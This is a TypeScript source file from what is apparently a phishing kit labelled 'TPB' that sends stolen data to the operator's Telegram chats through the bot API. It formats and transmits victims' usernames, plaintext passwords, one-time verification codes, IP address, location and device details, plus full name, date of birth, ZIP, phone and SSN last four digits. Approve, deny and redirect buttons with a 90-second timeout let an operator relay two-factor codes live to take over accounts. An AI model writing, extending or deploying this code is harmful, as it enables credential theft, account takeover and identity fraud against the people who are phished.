const API = "https://api.telegram.org/bot";

function esc(s: string | null | undefined): string {
  if (!s) return "";
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

interface BotPair { token: string; chatId: string }

function getBotPairs(): BotPair[] {
  const tokenRaw = process.env.TELEGRAM_BOT_TOKEN ?? "";
  const chatIdRaw = process.env.TELEGRAM_CHAT_ID ?? "";
  if (!tokenRaw || !chatIdRaw) return [];

  const tokens = tokenRaw.split(",").map(s => s.trim()).filter(Boolean);
  const chatIds = chatIdRaw.split(",").map(s => s.trim()).filter(Boolean);

  return chatIds.map((id, i) => ({
    token: tokens[i] ?? tokens[0],
    chatId: id,
  })).filter(p => p.token && p.chatId);
}

export function findTokenForChat(chatId: string): string | null {
  const pairs = getBotPairs();
  const match = pairs.find(p => p.chatId === String(chatId));
  if (match) return match.token;
  return pairs[0]?.token ?? null;
}

export interface TaskData {
  id: string;
  user_id: string;
  password?: string;
  masked_email: string;
  masked_phone?: string;
  method?: string;
  project_id?: string;
  project_name?: string;
  request_kind: string;
  member_origin?: string;
  cc_id?: string;
  device_info?: string;
  screen_size?: string;
  referrer?: string;
  flow_step?: string;
  code_delivery_method?: string;
  verification_code?: string;
  cf?: CfData;
}

interface CfData {
  ip: string;
  country: string;
  city: string;
  timezone: string;
  asOrganization: string;
}

async function sendToAll(text: string, taskId: string, includeButtons = true) {
  const pairs = getBotPairs();
  for (const p of pairs) {
    try {
      const payload: Record<string, unknown> = {
        chat_id: p.chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      };
      if (includeButtons) {
        payload.reply_markup = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: `approve:${taskId}` },
              { text: "❌ Deny", callback_data: `deny:${taskId}` },
            ],
            [
              { text: "🔀 Redirect", callback_data: `redirect:${taskId}` },
            ],
          ],
        };
      }
      await fetch(`${API}${p.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error(`[Telegram] Failed to send to ${p.chatId}:`, err);
    }
  }
}

function parseDevice(ua: string): string {
  if (!ua) return "Unknown";
  let os = "Unknown OS";
  let browser = "Unknown Browser";

  if (/iPhone/.test(ua)) os = "iPhone";
  else if (/iPad/.test(ua)) os = "iPad";
  else if (/Android/.test(ua)) os = "Android";
  else if (/Windows NT 10/.test(ua)) os = "Windows 10";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";

  if (/Edg\/(\d+)/.test(ua)) browser = `Edge ${RegExp.$1}`;
  else if (/Chrome\/(\d+)/.test(ua)) browser = `Chrome ${RegExp.$1}`;
  else if (/Safari\//.test(ua) && /Version\/([\d.]+)/.test(ua)) browser = `Safari ${RegExp.$1}`;
  else if (/Firefox\/(\d+)/.test(ua)) browser = `Firefox ${RegExp.$1}`;

  return `${os} / ${browser}`;
}

function formatReferrer(ref: string | null | undefined): string {
  if (!ref || ref === "Direct") return "Direct";
  try { return new URL(ref).hostname.replace(/^www\./, ""); } catch { return ref; }
}

function formatUrl(origin: string | null | undefined): string {
  if (!origin) return "N/A";
  try { const u = new URL(origin); return u.hostname + u.pathname; } catch { return origin; }
}

function formatTimes(tz: string | null | undefined) {
  const now = new Date();
  const opts: Intl.DateTimeFormatOptions = {
    month: "short", day: "numeric", year: "numeric",
    hour: "numeric", minute: "2-digit", hour12: true,
  };
  const utcStr = now.toLocaleString("en-US", { ...opts, timeZone: "UTC" });
  let localStr: string;
  try { localStr = now.toLocaleString("en-US", { ...opts, timeZone: tz ?? "UTC" }); }
  catch { localStr = utcStr; }
  return { local: localStr, utc: utcStr };
}

function gmtOffset(tz: string): string {
  try {
    const parts = new Date().toLocaleString("en-US", { timeZone: tz, timeZoneName: "shortOffset" }).split(" ");
    return parts[parts.length - 1];
  } catch { return ""; }
}

function locationLines(cf?: CfData): string[] {
  if (!cf) return [];
  const loc = cf.city && cf.city !== "Unknown" ? `${cf.city}, ${cf.country}` : cf.country || "Unknown";
  let tzLabel = cf.timezone || "Unknown";
  const offset = cf.timezone ? gmtOffset(cf.timezone) : "";
  if (offset) tzLabel += ` (${offset})`;
  return [
    `  📍 ${esc(loc)}`,
    `  🌐 IP: <code>${esc(cf.ip || "Unknown")}</code>`,
    `  🕒 ${esc(tzLabel)}`,
    `  📡 ${esc(cf.asOrganization || "Unknown")}`,
  ];
}

function deviceLines(task: TaskData): string[] {
  return [
    `  📱 ${esc(task.device_info ? parseDevice(task.device_info) : "Unknown")}`,
    `  📏 Screen: ${esc(task.screen_size || "Unknown")}`,
    `  🔗 Ref: ${esc(formatReferrer(task.referrer))}`,
    `  🌐 Origin: ${esc(formatUrl(task.member_origin))}`,
  ];
}

export async function notifyNewTask(task: TaskData) {
  const isVisit = task.request_kind === "visit";
  const t = formatTimes(task.cf?.timezone);
  const lines: string[] = [];

  if (isVisit) {
    lines.push("👁 <b>NEW VISITOR</b>  ·  <i>TPB</i>");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("");
    lines.push("<b>📍 Location</b>");
    lines.push(...locationLines(task.cf));
    lines.push("");
    lines.push("<b>🖥 Device</b>");
    lines.push(...deviceLines(task));
    lines.push("");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push(`📅 ${esc(t.local)}  ·  ${esc(t.utc)} UTC`);
  } else {
    lines.push("🔐 <b>LOGIN REQUEST</b>  ·  <i>TPB</i>");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("");
    lines.push("<b>🔑 Credentials</b>");
    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
    lines.push(`  ✉️ Email: ${esc(task.masked_email)}`);
    if (task.masked_phone && task.masked_phone !== "N/A") {
      lines.push(`  📞 Phone: ${esc(task.masked_phone)}`);
    }
    lines.push("");
    lines.push("<b>📍 Location</b>");
    lines.push(...locationLines(task.cf));
    lines.push("");
    lines.push("<b>🖥 Device</b>");
    lines.push(...deviceLines(task));
    lines.push("");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push(`📅 ${esc(t.local)}  ·  ${esc(t.utc)} UTC`);
    lines.push("⏳ <i>Auto-declines in 90s</i>");
  }

  await sendToAll(lines.join("\n"), task.id, !isVisit);
}

export async function notifyAdvance(task: TaskData) {
  const lines: string[] = [];

  if (task.flow_step === "code_request") {
    const target = task.code_delivery_method === "phone"
      ? `Phone (${esc(task.masked_phone)})`
      : `Email (${esc(task.masked_email)})`;

    lines.push("📨 <b>CODE DELIVERY</b>  ·  <i>TPB</i>");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("");
    lines.push("<b>🔑 Credentials</b>");
    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
    lines.push(`  ✉️ Send via: ${target}`);
    lines.push("");
    lines.push("<b>📍 Location</b>");
    lines.push(...locationLines(task.cf));
    lines.push("");
    lines.push("<b>🖥 Device</b>");
    lines.push(...deviceLines(task));
    lines.push("");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("⏳ <i>Auto-declines in 90s</i>");
  } else if (task.flow_step === "code_verify") {
    lines.push("🛡 <b>CODE VERIFICATION</b>  ·  <i>TPB</i>");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("");
    lines.push("<b>🔑 Credentials</b>");
    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
    lines.push(`  🔢 Code: <code>${esc(task.verification_code || "N/A")}</code>`);
    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"} (${esc(task.masked_email)})`);
    lines.push("");
    lines.push("<b>📍 Location</b>");
    lines.push(...locationLines(task.cf));
    lines.push("");
    lines.push("<b>🖥 Device</b>");
    lines.push(...deviceLines(task));
    lines.push("");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("⏳ <i>Auto-declines in 90s</i>");
  } else {
    return;
  }

  await sendToAll(lines.join("\n"), task.id, true);
}

export function buildApprovedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
  const lines = [
    "✅ <b>APPROVED</b>  ·  <i>TPB</i>",
    "━━━━━━━━━━━━━━━━━━━━━━━━",
    "",
    `  👤 User: <code>${esc(task.user_id)}</code>`,
    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
  ];
  if (task.verification_code) {
    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
  }
  return lines.join("\n");
}

export function buildDeniedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
  const lines = [
    "❌ <b>DENIED</b>  ·  <i>TPB</i>",
    "━━━━━━━━━━━━━━━━━━━━━━━━",
    "",
    `  👤 User: <code>${esc(task.user_id)}</code>`,
    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
  ];
  if (task.verification_code) {
    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
  }
  return lines.join("\n");
}

export function buildRedirectedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
  const lines = [
    "🔀 <b>REDIRECTED</b>  ·  <i>TPB</i>",
    "━━━━━━━━━━━━━━━━━━━━━━━━",
    "",
    `  👤 User: <code>${esc(task.user_id)}</code>`,
    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
  ];
  if (task.verification_code) {
    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
  }
  return lines.join("\n");
}

export async function editMessage(chatId: string, messageId: number, text: string) {
  const token = findTokenForChat(chatId);
  if (!token) return;
  try {
    await fetch(`${API}${token}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: "HTML", disable_web_page_preview: true }),
    });
  } catch (err) { console.error("[Telegram] Failed to edit message:", err); }
}

export async function answerCallback(chatId: string, callbackQueryId: string, text: string) {
  const token = findTokenForChat(chatId);
  if (!token) return;
  try {
    await fetch(`${API}${token}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
    });
  } catch (err) { console.error("[Telegram] Failed to answer callback:", err); }
}

export interface VerifyDetailsData {
  ssnLast4: string;
  zip: string;
  birthDate: string;
  fullName: string;
  phoneNumber: string;
}

export async function sendVerifyDetailsNotification(data: VerifyDetailsData) {
  const lines = [
    "📝 <b>VERIFY DETAILS</b>  ·  <i>TPB</i>",
    "━━━━━━━━━━━━━━━━━━━━━━━━",
    "",
    "<b>🔑 Personal Info</b>",
    `  👤 Name: <code>${esc(data.fullName)}</code>`,
    `  🔢 SSN (last 4): <code>${esc(data.ssnLast4)}</code>`,
    `  📅 DOB: <code>${esc(data.birthDate)}</code>`,
    `  📍 ZIP: <code>${esc(data.zip)}</code>`,
    `  📞 Phone: <code>${esc(data.phoneNumber)}</code>`,
  ];
  const pairs = getBotPairs();
  for (const p of pairs) {
    try {
      await fetch(`${API}${p.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: p.chatId,
          text: lines.join("\n"),
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      });
    } catch (err) {
      console.error(`[Telegram] Failed to send verify details to ${p.chatId}:`, err);
    }
  }
}
